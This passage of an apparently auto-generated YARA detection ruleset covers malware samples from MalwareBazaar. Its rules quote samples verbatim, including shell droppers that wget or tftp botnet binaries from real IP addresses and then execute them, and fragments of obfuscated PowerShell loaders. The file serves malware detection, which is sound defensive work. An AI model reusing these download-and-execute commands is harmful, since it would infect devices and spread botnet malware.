      $s4 = "    [DllImport(\"kernel32.dll\")]" fullword ascii
      $s5 = "        Add-Type -AssemblyName System.IO.Compression.FileSystem" fullword ascii
      $s6 = "        [System.IO.Compression.ZipFile]::ExtractToDirectory($z,$x)" fullword ascii
      $s7 = "$h=[W]::GetConsoleWindow()" fullword ascii
      $s8 = "    public static extern IntPtr GetConsoleWindow();" fullword ascii
      $s9 = "        }" fullword ascii /* reversed goodware string '}        ' */
      $s10 = "        $x=Join-Path $env:TEMP (d $r.x)" fullword ascii
      $s11 = "        $z=Join-Path $env:TEMP (d $r.z)" fullword ascii
      $s12 = "    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);" fullword ascii
      $s13 = ";e=\"SVVTZXJ2aWNlLmV4ZQ==\"}" fullword ascii
      $s14 = ";e=\"SVVTZXJ2aWNlLmV4ZQ==\"}," fullword ascii
      $s15 = "foreach($r in $e){" fullword ascii
      $s16 = "Add-Type @\"" fullword ascii
      $s17 = "[W]::ShowWindow($h,0)" fullword ascii
      $s18 = "            $b = [math]::Sqrt($b + 1)" fullword ascii
      $s19 = "public class W {" fullword ascii
      $s20 = "        while ($c -lt 500){" fullword ascii
   condition:
      uint16(0) == 0x6524 and filesize < 4KB and
      1 of ($x*) and 4 of them
}

rule sig_5e110c6a75fe27b5397c78238bc5a434d145ee95af9ea17ac82864588e1fe66e {
   meta:
      description = "evidences - file 5e110c6a75fe27b5397c78238bc5a434d145ee95af9ea17ac82864588e1fe66e.ps1"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "5e110c6a75fe27b5397c78238bc5a434d145ee95af9ea17ac82864588e1fe66e"
   strings:
      $s1 = "[System.Text.Encoding]::ascii.((-join (@((-878+949),(-5009+(6523-(7649982/5414))),(633-517),(437244/5268),(842392/7262),(-6318+(" ascii
      $s2 = "9VQSS+8M4EmcwE7ry7DaoTXjpbGPYHMD3vcG0N0O7EN9Wi5B/TLtYdkC2KsHsi1pzUsi5nxhya6WcyCi59SdU7FTpylBqTsPykCgcDGgK0RS9fT412s7PW7IApZafOGV" ascii
      $s3 = "$zqhnlj=$executioncontext;$isenbeorbeisaratarrere = (-jOiN (@((-5780+5833),(3716-3664),(227772/(11487-(13996-(59689880/9176))))," ascii
      $s4 = "cBQJ5Sd3svuDGi03ePWC5fUutyiOMqYltbudbSHDEWbg6w3tfs27LRFBciVvuTXrao37NSEyEiYmerr1au3SxTInu/IhEjwPZqWi7Yn6gycifKJm/E2XARnykkbEdSU4" ascii
      $s5 = "G6P6RhkJKyWtOaZDLlIh6L2NxEXIWx5fZ/ldcSIcephW+lHTchU5nz7aHoR4DQvRkSjJigR0FA1ivloIiHdHx7gGpGpVVwPlb/AKxI7YDQhxsgK0wgzGHw6mvO8Fc5B0" ascii
      $s6 = ") -join ''))($evxq7k3i9dhlg65, ([IO.Compression.CompressionMode]::Decompress))" fullword ascii
      $s7 = "Each-Object {[char]([int]\"01070125014001100121013201410125\".Substring(($_ * ([math]::Pow(2, 1 + 1))), ([math]::Pow(2, 1 + 1)))" ascii
      $s8 = "000001160000012100000115\".Substring(($_ * ([math]::Pow(2, 2 + 1))), ([math]::Pow(2, 2 + 1))) - 66)});$alederesatedinalinenonate" ascii
      $s9 = "$zqhnlj=$executioncontext;$isenbeorbeisaratarrere = (-jOiN (@((-5780+5833),(3716-3664),(227772/(11487-(13996-(59689880/9176))))," ascii
      $s10 = "lriVKYGUVQk4gjT2mj0N1UUGGyye+FL1U2Mgb/0/tJN9TMx1hv34w14pcsTLPSsdyK82lXoQyjS5YJlktjHuVhs8S+2aB5FkLHo+iSR/ujne7kaYDloAwVdwKyutstwU" ascii
      $s11 = "zk+01nVB75t6FmJkpJGWu6CoiLdF2FNhTmjwtYZCJNRCEQx/gG5sKw2r9LJye+y/MwpmsRHCEmUm2VfLRBMnvBo3roD3aVHSOTM7gKhkJNhPu/HDauBGD/0eUjLvxJGp" ascii
      $s12 = "h9gUzIS57knXj4nSfNtG6t1Twpx824/bEq/GCxZOtBWFOZ2wXRAcIaTaj4VPpoqaN63tci4eBoKTiIA4jCB/vEMGkow77+FiGGz7vFQKgru154V/WH4Hj8Lwdt86YcnA" ascii
      $s13 = "o6wgbCi4y5GJiMjRZSk++tA3jshUr0jAXcwf0Z9KbxPaBe+tnt/1od+E0NxMXQ4Yn9CpIU7FHRYjdVBDlrtHV3TRmgILDZ5LiH6W0Kcp70k1g0h11YPHBVyMSt+TWa3E" ascii
      $s14 = "hVyBlH5fn4Y6AnuaEg5tavPp7EzQgodEXqBgna6NYrUg9XRLnBiiCUjGRnPRWy+97x1EwVrbuUR5WvsDvXMlRx6gVK3bbR/9dikJaemum8wFZRlAJruE965uugxiHAId" ascii
      $s15 = "UNWHuGD1jM+lDWgOECigvpp2K8tFq7L7jqrWwddKFuVzSbLineeUiMXkoe7l/i1PZsJiuYH6Y7ZW+0/8exhKjUCLZTfrlB8grm2mzMsuivIDK2xT14/OSkd4X02SwnoA" ascii
      $s16 = "VAjXAVKBHJNeQyfd86LMg3+N6BIbYrR/v52XtiBHYn/of0p4YABaPCzuXhddAE60iTOAWZR723IowtrwIi9735fx5IvY2C0vGCr4R+cYWmE4oIhQXEHPiqtkJVD58GFX" ascii
      $s17 = "kPbogtx68olDOG0WohlrJvDmiTKzXZzHF8c5q/pHJMLKA55Of6/j/oNQmjbc1O5yJaziy7+u5QDs1N9eze4NvRKi+XBSH/h1GR6J6TWoaeTQPb25PmNHMgHlnQLKwXIq" ascii
      $s18 = "Qpz8BRh1Dz+FHalKM5zXpyWLkXIejQxd0EBRb6o0Hsw72Ap22wCU0lbDeJRPyKAySVyPGYlHVCrNsN/Ryf8/3Tt81H/7XK1QYt9DTT6LTzQFPq2q0qrq00jI8RVs2e8W" ascii
      $s19 = "SipPODM5RwwWESyYfj8a2i7rQsRLDjDkz/93wt2wK10ERbfkgf/CqrMfQbg6Nec0G+iY/CIr/lhJn6uu6vq/MO6GpedCnYunmB6EnaGBe32RQjdMt3vOT5ndrqBX9xlP" ascii
      $s20 = "WVF4V6k6wYefTK8Ji3pJDWRpk0pROj9IZsUz/WR5NLKUQzuFlys9G6z8me8IcIrdAnygTH8QrTu8MZLgDQnwEp4jXnOhd91/e0lyxX2kLx1qePt2LjzCIYrOwPZI+rB9" ascii
   condition:
      uint16(0) == 0x7a24 and filesize < 60KB and
      8 of them
}

rule sig_28dedd67eaeeb24ec4663e310d64bcac20becae4bf07b6425b49b245565b0fd6 {
   meta:
      description = "evidences - file 28dedd67eaeeb24ec4663e310d64bcac20becae4bf07b6425b49b245565b0fd6.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "28dedd67eaeeb24ec4663e310d64bcac20becae4bf07b6425b49b245565b0fd6"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.64.215.71/arm6; chmod +x arm6; ./arm6 ipcam" fullword ascii
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.64.215.71/mpsl; chmod +x mpsl; ./mpsl ipcam" fullword ascii
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.64.215.71/x86_64; chmod +x x86_64; ./x86_64 ipcam" fullword ascii
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.64.215.71/arm7; chmod +x arm7; ./arm7 ipcam" fullword ascii
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.64.215.71/mips; chmod +x mips; ./mips ipcam" fullword ascii
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.64.215.71/arm4; chmod +x arm4; ./arm4 ipcam" fullword ascii
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.64.215.71/arm5; chmod +x arm5; ./arm5 ipcam" fullword ascii
   condition:
      uint16(0) == 0x6463 and filesize < 2KB and
      all of them
}

rule sig_2a117ae4c62d818f97b01a11b2959c5ea113222dcd8559af1e71acb5f7d434e7 {
   meta:
      description = "evidences - file 2a117ae4c62d818f97b01a11b2959c5ea113222dcd8559af1e71acb5f7d434e7.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "2a117ae4c62d818f97b01a11b2959c5ea113222dcd8559af1e71acb5f7d434e7"
   strings:
      $s1 = ",C+MhN+rC" fullword ascii
      $s2 = "td*[tc" fullword ascii
      $s3 = "oZWa5W" fullword ascii
      $s4 = " 3\\\\QB" fullword ascii
      $s5 = "7\\K7{? " fullword ascii
      $s6 = "wF_Zgp" fullword ascii
      $s7 = "/2~:%=%p" fullword ascii
      $s8 = "96k> Uk" fullword ascii
      $s9 = "{V/)e7d" fullword ascii
      $s10 = "ML:}w'" fullword ascii
      $s11 = "Z/o?Ha" fullword ascii
      $s12 = "DWN$JK?" fullword ascii
      $s13 = "._Z/Cb" fullword ascii
      $s14 = "7vqnwaB" fullword ascii
      $s15 = "{>7\"u#" fullword ascii
      $s16 = "Q(;HxsD" fullword ascii
      $s17 = "2chVV>" fullword ascii
      $s18 = "fk!lV " fullword ascii
      $s19 = "{`#1EO" fullword ascii
      $s20 = "Srzm$c" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      8 of them
}

rule sig_85d8183f2497705952ed6bc547abdfe1072cbed72d0faa055de949d6d92d8f5f {
   meta:
      description = "evidences - file 85d8183f2497705952ed6bc547abdfe1072cbed72d0faa055de949d6d92d8f5f.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "85d8183f2497705952ed6bc547abdfe1072cbed72d0faa055de949d6d92d8f5f"
   strings:
      $s1 = "mmap failed." fullword ascii
      $s2 = "RVSPUWVS" fullword ascii
      $s3 = "NdRp]Zm[" fullword ascii
      $s4 = "\\7h)@}" fullword ascii
      $s5 = "$Info: " fullword ascii
      $s6 = "8$? 'oQY" fullword ascii
      $s7 = "tV|*EA" fullword ascii
      $s8 = "JsZ.AJ_p" fullword ascii
      $s9 = "Nh[cj&" fullword ascii
      $s10 = "fI7c}f" fullword ascii
      $s11 = ";gK=5k" fullword ascii
      $s12 = "'1~4Nj" fullword ascii
      $s13 = "x}{/`l" fullword ascii
      $s14 = "5`vSIDW>" fullword ascii
      $s15 = "%EWK^F" fullword ascii
      $s16 = "f#F_R?" fullword ascii
      $s17 = "r$%!uSgzU-" fullword ascii
      $s18 = "E*r9*ABp" fullword ascii
      $s19 = "PHH!AwD" fullword ascii
      $s20 = "%q@cM]" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      8 of them
}

rule sig_88a5ec4709e75598c567094063013148a1e1ae8b3cefcffe096f7b0a574573e2 {
   meta:
      description = "evidences - file 88a5ec4709e75598c567094063013148a1e1ae8b3cefcffe096f7b0a574573e2.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "88a5ec4709e75598c567094063013148a1e1ae8b3cefcffe096f7b0a574573e2"
   strings:
      $s1 = "mmap failed." fullword ascii
      $s2 = "RVSPUWVS" fullword ascii
      $s3 = "Qmqb\":" fullword ascii
      $s4 = "KbpRq/Y" fullword ascii
      $s5 = "$Info: " fullword ascii
      $s6 = "8$? 'oQY" fullword ascii
      $s7 = "f#F_R?" fullword ascii
      $s8 = "B28q/M" fullword ascii
      $s9 = "/=6Y=_W" fullword ascii
      $s10 = "nRQdUD" fullword ascii
      $s11 = "J'fDJd&" fullword ascii
      $s12 = "P}04?0#" fullword ascii
      $s13 = "g_S6{V" fullword ascii
      $s14 = "&/a=ja" fullword ascii
      $s15 = "eGwVy@" fullword ascii
      $s16 = "4>*Wem" fullword ascii
      $s17 = "N<bUe h" fullword ascii
      $s18 = ">6$[^!S" fullword ascii
      $s19 = "tL:j5;\\r" fullword ascii
      $s20 = "BFi< Z" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      8 of them
}

rule e8f8a06e8f174409f3983e43eb748a8e8151e65f814222ac3212fa8ab5bc043d {
   meta:
      description = "evidences - file e8f8a06e8f174409f3983e43eb748a8e8151e65f814222ac3212fa8ab5bc043d.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "e8f8a06e8f174409f3983e43eb748a8e8151e65f814222ac3212fa8ab5bc043d"
   strings:
      $s1 = "!mmap failed." fullword ascii
      $s2 = "AXQKZn&" fullword ascii
      $s3 = "gVmtR7" fullword ascii
      $s4 = "ZmOWD3" fullword ascii
      $s5 = "$Info: " fullword ascii
      $s6 = ".FGe7f/" fullword ascii
      $s7 = "U:[zb`^" fullword ascii
      $s8 = "-%wWDJ" fullword ascii
      $s9 = "bHi0 *" fullword ascii
      $s10 = "@.UH@.9" fullword ascii
      $s11 = "ADL}n[" fullword ascii
      $s12 = "x}:Kx/" fullword ascii
      $s13 = "c(ET6$" fullword ascii
      $s14 = "T1>:{?" fullword ascii
      $s15 = "eE@s#eS" fullword ascii
      $s16 = "0Ti 6 " fullword ascii
      $s17 = "?/PA>f" fullword ascii
      $s18 = "7UP7W`.;%" fullword ascii
      $s19 = ".p}HSx|" fullword ascii
      $s20 = "}]+[4p" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      8 of them
}

rule sig_748e9de51b1bdb57ffdb4ca2103bbb43b127d34d59070f226de9bea93d470095 {
   meta:
      description = "evidences - file 748e9de51b1bdb57ffdb4ca2103bbb43b127d34d59070f226de9bea93d470095.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "748e9de51b1bdb57ffdb4ca2103bbb43b127d34d59070f226de9bea93d470095"
   strings:
      $s1 = "PROT_EXEC|PROT_WRITE failed." fullword ascii
      $s2 = "HVNo-ze" fullword ascii
      $s3 = "NEZz5ox=" fullword ascii
      $s4 = "nPdl'6O" fullword ascii
      $s5 = "XXIL>`g" fullword ascii
      $s6 = "'/proc/self/exe" fullword ascii
      $s7 = "gwAb'<I" fullword ascii
      $s8 = "$Info: " fullword ascii
      $s9 = "5RBOGF" fullword ascii
      $s10 = "O|r^4==M" fullword ascii
      $s11 = "ukBMSq" fullword ascii
      $s12 = "Q_07*2'" fullword ascii
      $s13 = "u?QK`t" fullword ascii
      $s14 = "gTNDG~" fullword ascii
      $s15 = "uo,dukAC" fullword ascii
      $s16 = "}W=o)5" fullword ascii
      $s17 = "r}8lfG}" fullword ascii
      $s18 = "(!DJ<1" fullword ascii
      $s19 = "_xg7}.f" fullword ascii
      $s20 = "S^GC58" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      8 of them
}

rule sig_2b2c50a8ddc23111fdde76c96f3d98368c7b3ff303ed53828f1535fe66263508 {
   meta:
      description = "evidences - file 2b2c50a8ddc23111fdde76c96f3d98368c7b3ff303ed53828f1535fe66263508.js"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "2b2c50a8ddc23111fdde76c96f3d98368c7b3ff303ed53828f1535fe66263508"
   strings:
      $x1 = "ContentLoader.afterFn = () => ContentLoader.downloadThread(imgOnly);" fullword ascii
      $x2 = "Logger.log('Read my posts');" fullword ascii
      $s3 = "Logger.log('Init keybinds');" fullword ascii
      $s4 = "ContentLoader.downloadThread(imgOnly);" fullword ascii
      $s5 = "Logger.log('Parse postform');" fullword ascii
      $s6 = "Logger.log('Hide posts');" fullword ascii
      $s7 = "VideosParser._parserHelper('a[href*=\"vimeo.com\"]', data, loader, isPost, false, Videos.vimReg);" fullword ascii
      $s8 = "const oClass = /* new.target */ this.constructor; // https://github.com/babel/babel/issues/1088" fullword ascii
      $s9 = "script.src = aib.protocol + '//www.youtube.com/player_api';" fullword ascii
      $s10 = "ContentLoader.getDataFromImg($q('video', _fullEl)).then(arr => {" fullword ascii
      $s11 = "ContentLoader.preloadImages(post);" fullword ascii
      $s12 = "deWindow.URL.createObjectURL(blob) }\" download=\"${ name }\" target=\"_blank\">${" fullword ascii
      $s13 = "console.log('Repeated thread: ' + num);" fullword ascii
      $s14 = "--><div>You need a block bypass to post</div><!--" fullword ascii
      $s15 = "const gitRaw = 'https://raw.githubusercontent.com/SthephanShinkufag/Dollchan-Extension-Tools/master/';" fullword ascii
      $s16 = "return Cfg.webmControl && e.clientY > (e.target.getBoundingClientRect().bottom - 40);" fullword ascii
      $s17 = "$id('de-panel-info-posts').textContent = Thread.first.postsCount - Thread.first.hiddenCount;" fullword ascii
      $s18 = "entry.url = aib.protocol + '//' + aib.host + aib.getPageUrl(board, 0);" fullword ascii
      $s19 = "Logger.log('Replace delform');" fullword ascii
      $s20 = "const temp = KeyEditListener.getEditMarkup(keys);" fullword ascii
   condition:
      uint16(0) == 0x2f2f and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule sig_39a015004f81ccec69b77f96a61e213b4af05f6e97cfe46e6d0f7a568ef51c48 {
   meta:
      description = "evidences - file 39a015004f81ccec69b77f96a61e213b4af05f6e97cfe46e6d0f7a568ef51c48.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "39a015004f81ccec69b77f96a61e213b4af05f6e97cfe46e6d0f7a568ef51c48"
   strings:
      $s1 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf mips ; wget http://91.188.254.21 /mips || tftp -gr mips 91.188.254.21  ; c" ascii
      $s2 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf mpsl ; wget http://91.188.254.21 /mpsl || tftp -gr mpsl 91.188.254.21  ; c" ascii
      $s3 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf mpsl ; wget http://91.188.254.21 /mpsl || tftp -gr mpsl 91.188.254.21  ; c" ascii
      $s4 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf mips ; wget http://91.188.254.21 /mips || tftp -gr mips 91.188.254.21  ; c" ascii
      $s5 = "hmod 777 mpsl ; ./mpsl goahead ;" fullword ascii
      $s6 = "hmod 777 mips ; ./mips goahead ; " fullword ascii
   condition:
      uint16(0) == 0x6463 and filesize < 1KB and
      all of them
}

rule d2bc4bc0065f883cf10a631a677d2f440fa4baab665280c8dc2126ae90a743ea {
   meta:
      description = "evidences - file d2bc4bc0065f883cf10a631a677d2f440fa4baab665280c8dc2126ae90a743ea.pdf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "d2bc4bc0065f883cf10a631a677d2f440fa4baab665280c8dc2126ae90a743ea"
   strings:
      $s1 = "22222222222222222222222222222222222222222222222222" ascii /* hex encoded string '"""""""""""""""""""""""""' */
      $s2 = "/dieresis/J)/Ascent 716/Type/FontDescriptor/Descent -176/XHeight 416/FontBBox[-251 -250 1009 969]/Flags 70>>" fullword ascii
      $s3 = "seven/eight/e/x/t/i/n/c/o/a/l/g/u/m/s/r/d)/Ascent 716/Type/FontDescriptor/Descent -176/XHeight 416/FontBBox[-27 -250 1122 750]/F" ascii
      $s4 = "z/seven/x/q/j/four/L/O/P/quoteleft/quoteright/I)/Ascent 716/Type/FontDescriptor/Descent -176/XHeight 416/FontBBox[-39 -250 1036 " ascii
      $s5 = "<</StemV 68/Flags 68/FontBBox[-163 -250 1146 969]/Type/FontDescriptor/ItalicAngle -14.04/Descent -176/FontName/DCPGLI+CMTI10/Cap" ascii
      $s6 = "<</StemV 65/Flags 6/FontBBox[-34 -251 988 750]/Type/FontDescriptor/ItalicAngle 0/Descent -176/FontName/DCOMPH+CMR12/CapHeight 70" ascii
      $s7 = "<</StemV 109/Flags 262150/FontBBox[-53 -251 1139 750]/Type/FontDescriptor/ItalicAngle 0/Descent -176/FontName/DCOMOG+CMBX12/CapH" ascii
      $s8 = "<</StemV 79/CapHeight 0/FontFile3 60 0 R/ItalicAngle 0/StemH 36/FontName/DCONBK+CMR7/CharSet(/one/three/two/four/comma/five/six/" ascii
      $s9 = "<</StemV 74/CapHeight 707/FontFile3 64 0 R/ItalicAngle 0/StemH 31/FontName/DCONCK+CMR9/CharSet(/t/comma/three/i/colon/one/plus/p" ascii
      $s10 = "<</FirstChar 65/BaseFont/DCOMOG+CMBX12/ToUnicode 39 0 R/Type/Font/LastChar 121/Subtype/Type1/Widths[850 375 813 375 375 375 375 " ascii
      $s11 = "<</StemV 109/Flags 262150/FontBBox[-53 -251 1139 750]/Type/FontDescriptor/ItalicAngle 0/Descent -176/FontName/DCOMOG+CMBX12/CapH" ascii
      $s12 = "<</StemV 69/CapHeight 707/FontFile3 56 0 R/ItalicAngle 0/StemH 31/FontName/DCONBJ+CMR10/CharSet(/t/comma/M/O/i/y/L/P/d/x/parenle" ascii
      $s13 = "<</FirstChar 44/BaseFont/DCOMPH+CMR12/ToUnicode 43 0 R/Type/Font/LastChar 168/Subtype/Type1/Widths[272 326 326 490 490 490 490 4" ascii
      $s14 = "<</StemV 65/Flags 6/FontBBox[-34 -251 988 750]/Type/FontDescriptor/ItalicAngle 0/Descent -176/FontName/DCOMPH+CMR12/CapHeight 70" ascii
      $s15 = "222+++" fullword ascii /* reversed goodware string '+++222' */
      $s16 = " 525 525 525 525 525 525 525 525 525 525 525 525]/Encoding 169 0 R/FontDescriptor 170 0 R>>" fullword ascii
      $s17 = "<</FirstChar 1/BaseFont/DCPDCH+CMSY6/ToUnicode 88 0 R/Type/Font/LastChar 1/Subtype/Type1/Widths[639]/Encoding 86 0 R/FontDescrip" ascii
      $s18 = "<</StemV 74/Flags 68/FontBBox[-29 -250 1075 750]/Type/FontDescriptor/ItalicAngle -14.04/Descent 0/FontName/DCPGDK+CMMI9/CapHeigh" ascii
      $s19 = "FontDescriptor>>" fullword ascii
      $s20 = "3 343 343 343 343 343 343 285 285 343 343 571]/Encoding 61 0 R/FontDescriptor 62 0 R>>" fullword ascii
   condition:
      uint16(0) == 0x5025 and filesize < 900KB and
      8 of them
}

rule sig_5bc44c8a78da90b1bba46651deb79cdf8ccff8d2754dfe00a0800756aa02fbe9 {
   meta:
      description = "evidences - file 5bc44c8a78da90b1bba46651deb79cdf8ccff8d2754dfe00a0800756aa02fbe9.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "5bc44c8a78da90b1bba46651deb79cdf8ccff8d2754dfe00a0800756aa02fbe9"
   strings:
      $s1 = "(wget http://94.156.227.135/tt/armv4eb -O- || busybox wget http://94.156.227.135/tt/armv4eb -O-) > .f; chmod 777 .f; ./.f tscan;" ascii
      $s2 = "(wget http://94.156.227.135/tt/armv4l -O- || busybox wget http://94.156.227.135/tt/armv4l -O-) > .f; chmod 777 .f; ./.f tscan; >" ascii
      $s3 = "(wget http://94.156.227.135/tt/sparc -O- || busybox wget http://94.156.227.135/tt/sparc -O-) > .f; chmod 777 .f; ./.f tscan; > ." ascii
      $s4 = "(wget http://94.156.227.135/tt/armv4l -O- || busybox wget http://94.156.227.135/tt/armv4l -O-) > .f; chmod 777 .f; ./.f tscan; >" ascii
      $s5 = "(wget http://94.156.227.135/tt/mipsel -O- || busybox wget http://94.156.227.135/tt/mipsel -O-) > .f; chmod 777 .f; ./.f tscan; >" ascii
      $s6 = "(wget http://94.156.227.135/tt/sparc -O- || busybox wget http://94.156.227.135/tt/sparc -O-) > .f; chmod 777 .f; ./.f tscan; > ." ascii
      $s7 = "(wget http://94.156.227.135/tt/armv7l -O- || busybox wget http://94.156.227.135/tt/armv7l -O-) > .f; chmod 777 .f; ./.f tscan; >" ascii
      $s8 = "(wget http://94.156.227.135/tt/riscv32 -O- || busybox wget http://94.156.227.135/tt/riscv32 -O-) > .f; chmod 777 .f; ./.f tscan;" ascii
      $s9 = "(wget http://94.156.227.135/tt/armv7l -O- || busybox wget http://94.156.227.135/tt/armv7l -O-) > .f; chmod 777 .f; ./.f tscan; >" ascii
      $s10 = "(wget http://94.156.227.135/tt/arc -O- || busybox wget http://94.156.227.135/tt/arc -O-) > .f; chmod 777 .f; ./.f tscan; > .f; #" ascii
      $s11 = "(wget http://94.156.227.135/tt/mips -O- || busybox wget http://94.156.227.135/tt/mips -O-) > .f; chmod 777 .f; ./.f tscan; > .f;" ascii
      $s12 = "(wget http://94.156.227.135/tt/armv4eb -O- || busybox wget http://94.156.227.135/tt/armv4eb -O-) > .f; chmod 777 .f; ./.f tscan;" ascii
      $s13 = "(wget http://94.156.227.135/tt/mipsel -O- || busybox wget http://94.156.227.135/tt/mipsel -O-) > .f; chmod 777 .f; ./.f tscan; >" ascii
      $s14 = "(wget http://94.156.227.135/tt/armv5l -O- || busybox wget http://94.156.227.135/tt/armv5l -O-) > .f; chmod 777 .f; ./.f tscan; >" ascii
      $s15 = "(wget http://94.156.227.135/tt/mips -O- || busybox wget http://94.156.227.135/tt/mips -O-) > .f; chmod 777 .f; ./.f tscan; > .f;" ascii
      $s16 = "(wget http://94.156.227.135/tt/powerpc -O- || busybox wget http://94.156.227.135/tt/powerpc -O-) > .f; chmod 777 .f; ./.f tscan;" ascii
      $s17 = "(wget http://94.156.227.135/tt/armv6l -O- || busybox wget http://94.156.227.135/tt/armv6l -O-) > .f; chmod 777 .f; ./.f tscan; >" ascii
      $s18 = "(wget http://94.156.227.135/tt/arc -O- || busybox wget http://94.156.227.135/tt/arc -O-) > .f; chmod 777 .f; ./.f tscan; > .f; #" ascii
      $s19 = "(wget http://94.156.227.135/tt/powerpc -O- || busybox wget http://94.156.227.135/tt/powerpc -O-) > .f; chmod 777 .f; ./.f tscan;" ascii
      $s20 = "(wget http://94.156.227.135/tt/armv5l -O- || busybox wget http://94.156.227.135/tt/armv5l -O-) > .f; chmod 777 .f; ./.f tscan; >" ascii
   condition:
      uint16(0) == 0x2f3e and filesize < 7KB and
      8 of them
}

rule sig_652d2ab3900da5cf25a34b2c2f953b65c19ddc884939a95ec9a4c270cc1bf3c1 {
   meta:
      description = "evidences - file 652d2ab3900da5cf25a34b2c2f953b65c19ddc884939a95ec9a4c270cc1bf3c1.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "652d2ab3900da5cf25a34b2c2f953b65c19ddc884939a95ec9a4c270cc1bf3c1"
   strings:
      $s1 = "(wget http://94.156.227.135/vv/armv4l -O- || busybox wget http://94.156.227.135/vv/armv4l -O-) > .f; chmod 777 .f; ./.f tvt; > ." ascii
      $s2 = "(wget http://94.156.227.135/vv/armv6l -O- || busybox wget http://94.156.227.135/vv/armv6l -O-) > .f; chmod 777 .f; ./.f tvt; > ." ascii
      $s3 = "(wget http://94.156.227.135/vv/armv5l -O- || busybox wget http://94.156.227.135/vv/armv5l -O-) > .f; chmod 777 .f; ./.f tvt; > ." ascii
      $s4 = "(wget http://94.156.227.135/vv/armv7l -O- || busybox wget http://94.156.227.135/vv/armv7l -O-) > .f; chmod 777 .f; ./.f tvt; > ." ascii
      $s5 = "(wget http://94.156.227.135/vv/armv7l -O- || busybox wget http://94.156.227.135/vv/armv7l -O-) > .f; chmod 777 .f; ./.f tvt; > ." ascii
      $s6 = "(wget http://94.156.227.135/vv/armv6l -O- || busybox wget http://94.156.227.135/vv/armv6l -O-) > .f; chmod 777 .f; ./.f tvt; > ." ascii
      $s7 = "(wget http://94.156.227.135/vv/armv5l -O- || busybox wget http://94.156.227.135/vv/armv5l -O-) > .f; chmod 777 .f; ./.f tvt; > ." ascii
      $s8 = "(wget http://94.156.227.135/vv/armv4l -O- || busybox wget http://94.156.227.135/vv/armv4l -O-) > .f; chmod 777 .f; ./.f tvt; > ." ascii
      $s9 = "f; # ; rm -rf .f;" fullword ascii
      $s10 = "echo \"$0 FIN\";" fullword ascii
   condition:
      uint16(0) == 0x2f3e and filesize < 3KB and
      all of them
}

rule a404d547abd7795fbf281f75cf9b4d0754a2e813a72c8c76c4a65285e4d8aceb {
   meta:
      description = "evidences - file a404d547abd7795fbf281f75cf9b4d0754a2e813a72c8c76c4a65285e4d8aceb.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "a404d547abd7795fbf281f75cf9b4d0754a2e813a72c8c76c4a65285e4d8aceb"
   strings:
      $s1 = "(wget http://94.156.227.135/vv/mipsel -O- || busybox wget http://94.156.227.135/vv/mipsel -O-) > .f; chmod 777 .f; ./.f rooster;" ascii
      $s2 = "(wget http://94.156.227.135/vv/sh4 -O- || busybox wget http://94.156.227.135/vv/sh4 -O-) > .f; chmod 777 .f; ./.f rooster; > .f;" ascii
      $s3 = "(wget http://94.156.227.135/vv/armv7l -O- || busybox wget http://94.156.227.135/vv/armv7l -O-) > .f; chmod 777 .f; ./.f rooster;" ascii
      $s4 = "(wget http://94.156.227.135/vv/superh-O- || busybox wget http://94.156.227.135/vv/superh -O-) > .f; chmod 777 .f; ./.f rooster; " ascii
      $s5 = "(wget http://94.156.227.135/vv/armv6l -O- || busybox wget http://94.156.227.135/vv/armv6l -O-) > .f; chmod 777 .f; ./.f rooster;" ascii
      $s6 = "(wget http://94.156.227.135/vv/riscv32 -O- || busybox wget http://94.156.227.135/vv/riscv32 -O-) > .f; chmod 777 .f; ./.f rooste" ascii
